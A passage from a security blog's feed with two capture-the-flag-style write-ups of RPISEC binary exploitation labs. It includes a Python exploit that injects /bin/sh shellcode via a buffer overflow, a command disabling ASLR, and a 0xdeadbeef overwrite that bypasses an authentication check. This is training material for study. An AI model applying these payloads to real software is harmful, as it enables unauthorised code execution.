that no return address was overwritten, neither from <strong>verify_user_name</strong> or <strong>verify_user_pass</strong>. Until we reached the return address of the main function, which got stuck because it was overwritten by our alphabet patter.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/retmain.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>We can notice that after 88 bytes of the pattern the return address of main is overwritten.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNN
|			88 bytes is stored in variable				       ||  this is overflowed  |       
|______________________________________________________________________________________||______________________|
</code></pre></div></div> <p>We have our buffer-overflow!</p> <h3 id="shellcode-time">Shellcode time</h3> <p>There came a time when I tried to put some shellcodes after the return address of the main function but I didn’t achieve anything. I was stuck for a while trying different ways and nothing.</p> <p>Until I asked for help and received tips on a better path to follow.</p> <p>In the source code, the variable that stores the username is outside the scope of the functions, that is, it is in the global scope. This means that it is in the .data section of the binary and not in the .text section where it is the executable area.</p> <p>With this we can know that the username variable will not be stored in the stack, but the password variable will. So the tip I received was to store the shellcode in the username variable and overwrite the return address in the password variable. To then “get” the shellcode in the username variable and thus execute it.</p> <h3 id="lets-go">Let’s go</h3> <p>If we look at the disassembly of the main function we see that the address of the username variable is referenced before being passed to the <strong>fgets</strong> function and then to the <strong>verify_user_name</strong> function.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/usrnmvar1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>And checking the variable’s memory we see the string “rpisec”.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/usrnmvar2.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Now knowing the address of the username variable and also how to overwrite the return address, let’s write our exploit…</p> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">struct</span>

<span class="n">name</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">rpisec</span><span class="sh">"</span>

<span class="c1"># addr a_user_name var that store username + 6 bytes to the shellcode addr
</span><span class="n">nameaddr</span> <span class="o">=</span> <span class="mh">0x555555558086</span>

<span class="c1"># 88 bytes to overflow
</span><span class="n">pattern</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGGGGGHHHHHHHHIIIIIIIIJJJJJJJJKKKKKKKK</span><span class="sh">"</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="sh">"</span>

<span class="n">nm</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;Q</span><span class="sh">'</span><span class="p">,</span> <span class="n">nameaddr</span><span class="p">)</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">name</span>		<span class="c1"># pass in verify_user_name function
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">shellcode</span>        <span class="c1"># /bin/sh shellcode
</span><span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\n</span><span class="sh">'</span>		<span class="c1"># break line to align the buffer
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">pattern</span>          <span class="c1"># buffer to overflow password var
</span><span class="n">buf</span> <span class="o">+=</span> <span class="n">nm</span>		<span class="c1"># addr of shellcode in name var
</span>

<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">exp</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</code></pre></div></div> <p>(shellcode source: https://shell-storm.org/shellcode/files/shellcode-806.html)</p> <p>After running the python code it sends the buffer to an “exp” file. And the exploration buffer looks like this:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/expfile.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rpisec + shellcode + pattern + addr of shellcode
</code></pre></div></div> <h3 id="shell-time">Shell time</h3> <p>After running we can see that the shellcode has been stored along with the rpisec string.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/shellcode1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Arriving at the ret main we see that the return address was successfully overwritten.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/shellcode2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Then we see that the shellcode address has been reached and the shellcode instructions are being executed successfully.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/shellcode3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>With everything ok in GDB, let’s run the exploit outside the debugger to get the shell on the machine. For execution outside of gdb to work, it will be necessary to disable ASLR so that the host machine does not randomize memory addresses.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ sudo sysctl kernel.randomize_va_space=0
</code></pre></div></div> <p>(disable aslr)</p> <p>Running the binary along with the exploit… we have the shell</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/pwned.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>It was difficult but it worked. :)</p>]]></content><author><name></name></author><category term="rpisec"/><category term="bin-exp"/><summary type="html"><![CDATA[rpisec lab3C]]></summary></entry><entry><title type="html">mem-corruption lab RPISEC</title><link href="https://geleiaa.github.io/blog/2023/mem_corruption_lab/" rel="alternate" type="text/html" title="mem-corruption lab RPISEC"/><published>2023-12-04T00:00:00+00:00</published><updated>2023-12-04T00:00:00+00:00</updated><id>https://geleiaa.github.io/blog/2023/mem_corruption_lab</id><content type="html" xml:base="https://geleiaa.github.io/blog/2023/mem_corruption_lab/"><![CDATA[<h3 id="solving-lab2c-0213---memory-corruption-lab-httpsgithubcomrpisecmbeblobmastersrclab02lab2cc">Solving lab2C “02/13 | –[ Memory Corruption Lab” (https://github.com/RPISEC/MBE/blob/master/src/lab02/lab2C.c)</h3> <h3 id="this-lab-is-a-simple-buffer-overflow-the-intention-of-this-lab-was-to-explore-bof-and-get-a-shell-from-the-lab-machine-and-then-get-the-flag-but-here-we-wont-have-the-shell-part">This lab is a simple buffer-overflow. The intention of this lab was to explore bof and get a shell from the lab machine and then get the flag. But here we won’t have the shell part.</h3> <p>First we go get the source code and compile following the instruction that is commented in the code:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/compilelab2ccode.png" class="img-fluid rounded z-depth-1" width="400" height="400" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gcc -O0 -fno-stack-protector lab2C.c -o lab2C
</code></pre></div></div> <p>Running the binary we see how to use it:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/binusage.png" class="img-fluid rounded z-depth-1" width="200" height="200" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Running with a string the binary shows that we are not “authenticated” and set_me is 0. It seems that the binary needs a specific string/password:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/notauth.png" class="img-fluid rounded z-depth-1" width="400" height="400" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Looking at the binary disassembly, we see that the <strong>strcpy</strong> function is called before a comparison of a memory address with the “0xdeadbeef” bytes. And if this comparison is not true, the flow jumps to the end, prints something and ends execution. But if the comparison is true, a “shell” function will be called.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ objdump -dM intel lab2C | grep -A40 "&lt;main&gt;:"
</code></pre></div></div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/jmp.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Looking at the disassembly of the shell function, we don’t see much useful stuff, just a <strong>puts</strong> function that can display some string and we also see a <strong>system</strong> function being called.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ objdump -dM intel lab2C | grep -A12 "&lt;shell&gt;:"
</code></pre></div></div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/disasshell.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h3 id="now-lets-debug-the-binary-to-see-what-it-does">Now let’s debug the binary to see what it does</h3> <p>Looking at the disassembly with gdb + peda we can better see the execution flow of the main function:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/gdbdisas.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Running the binary in gdb without passing any input string, the flow is diverted to a <strong>printf</strong> that shows the usage and then a jump throws the flow to the end of the execution:</p> <ul> <li>check input (<strong>cmp DWORD PTR [rbp-0x24],0x2</strong>)</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/withoutarg1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>if not have input, print the usage</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/withoutarg2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>jump to the end</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/withoutarg3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h3 id="since-the-binary-needs-an-input-lets-set-a-breakpoint-in-the-main-and-run-binary-with-an-input-string">Since the binary needs an input let’s set a breakpoint in the main and run binary with an input string…</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ b main
</code></pre></div></div> <p>(breakpoint)</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ r GELEIA
</code></pre></div></div> <p>(run binary with “GELEIA” string)</p> <p>Now running with a input the exec flow throws us to another place. First compare if have any args, so <strong>je</strong> (jump equal) go to address <strong>&lt;main+59&gt;</strong>.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/witharg1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>After some steps we arrive at the <strong>strcpy</strong> function that we saw before. We can see that the input is moved through the registers until it reaches the <strong>strcpy</strong> function. And probably the input is copied somewhere by the <strong>strcpy</strong> function. Soon after, a comparison of address <strong>DWORD PTR [rbp-0x4]</strong> with “0xdeadbeef” takes place.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/witharg2.png" class="img-fluid rounded z-depth-1" width="300" height="300" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>After comparing if <strong>DWORD PTR [rbp-0x4]</strong> address is equal to “0xdeadbeef” the flow jump to “shell” function. If not equal the flow jump to a <strong>printf</strong> with a message “Not authenticated. set_me was 0” and finishe execution.</p> <ul> <li>jump to end</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/witharg3.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>print message and finishes</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/witharg4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <h3 id="now-is-the-buffer-overflow">Now is the Buffer Overflow</h3> <p>Knowing that the given input is stored somewhere, we can overwrite the memory after the input is stored so we can control what will be compared. If this works, we will bypass the check.</p> <p>First we need to know how many bytes can be stored in the variable (or how much memory has been allocated to that variable). To do this, we will send a large number of bytes to the binary input and see how it handles that.</p> <p>The input will be this: “AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE”.</p> <p>This way we can know how many bytes the variable stores and when there was a memory leak. For example, if the variable stores the value until the end of the letters “B”, then we know that after the “B” the memory following the variable was overwritten.</p> <h3 id="lets-go">Let’s go</h3> <p>First let’s run the binary with gdb then set a breakpoint in main and then send the buffer to the binary like this:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ r $(echo 'AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE')
</code></pre></div></div> <p>Getting close to the part that checks the input we can see the alphabet buffer being moved through the registers</p> <ul> <li>first buffer go to <strong>RAX</strong> after go to <strong>RDX</strong></li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/buffmove1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/buffmove2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Passing in <strong>strcpy</strong> function the buffer is stored and after this the address <strong>DWORD PTR [rbp-0x4]</strong> will be compared.</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/compare1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>So if we look at what’s at that address, we see the bytes that overwrote the memory after the leak:</p> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/compare2.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>Basically the variable that stores the input has a limit of 15 bytes. Example:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE
|   1 to 15   ||       16 to 40        |
|_____________||_______________________|
this is stored  this overwrite the next memory

</code></pre></div></div> <p>Knowing this we can overwrite the next memory (after 15 bytes) with the “0xdeadbeef” bytes and bypass the check. That way:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>AAAAAAAABBBBBBB0xdeadbeef
</code></pre></div></div> <h3 id="so-lets-go">So let’s go</h3> <p>Using a python code to make it easier, we will print the buffer and send it to the binary input. The exploit looks like this:</p> <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">struct</span>

<span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x41</span><span class="sh">'</span> <span class="o">*</span> <span class="mi">15</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;Q</span><span class="sh">'</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>

<span class="n">f</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">exp</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">wb</span><span class="sh">"</span><span class="p">)</span>
<span class="n">f</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</code></pre></div></div> <p>Running the exploit will send the buffer to a file called exp. And when we run the binary we will send the file contents to the input, like this:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ r $(cat exp)
</code></pre></div></div> <p>Then let’s move on to the part that matters:</p> <ul> <li>we can see the exploration buffer being moved.</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exp1.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>Coming to the comparison, we see that the buffer overwrote the variable where it is stored and went to the memory of the next instruction.</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exp2.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exp3.png" class="img-fluid rounded z-depth-1" width="500" height="500" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>Since we have the memory overwritten, then the execution flow goes to the shell function as expected.</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exp4.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exp5.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <ul> <li>Now we get to the shell function and see what’s in it.</li> </ul> <div class="col-sm mt-3 mt-md-0"> <figure> <picture> <img src="/assets/img/exp6.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="eager" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> </div> <p>So it looks like we did this…</p>]]></content><author><name></name></author><category term="rpisec"/><category term="bin-exp"/><summary type="html"><![CDATA[rpisec lab2C]]></summary></entry></feed>